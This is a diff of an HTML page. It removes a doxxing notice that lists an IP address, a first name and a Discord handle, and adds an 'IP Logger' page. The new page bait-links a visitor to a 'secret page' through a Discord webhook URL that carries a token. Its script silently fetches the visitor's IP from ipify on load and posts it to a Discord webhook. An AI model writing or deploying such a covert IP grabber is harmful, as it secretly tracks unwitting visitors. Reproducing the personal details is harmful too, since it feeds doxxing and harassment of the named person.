@@ -1,7 +1,25 @@
-<h1>99.40.203.86</h1>
-
-<h1>LOGANS</h1>
-
-<h1>DOX</h1>
-
-<h1>His Discord xyqlcy</h1>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Welcome to the IP Logger!</h1>
+    <p>Click <a href="https://discord.com/api/webhooks/1253208817601351802/QCTUfUvxVqXVxySeEQ60WODIl2nZosa6eAUyVyG2V-8ggRceP-C4Czgwvuy5SyhxVUuy">here</a> to access the secret page!</p>
+    
+    <script>
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            fetch('https://discord.com/api/webhooks/yourwebhookid', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `IP Address: ${ipAddress}` })
+            });
+        });
+    </script>
+</body>
+</html>
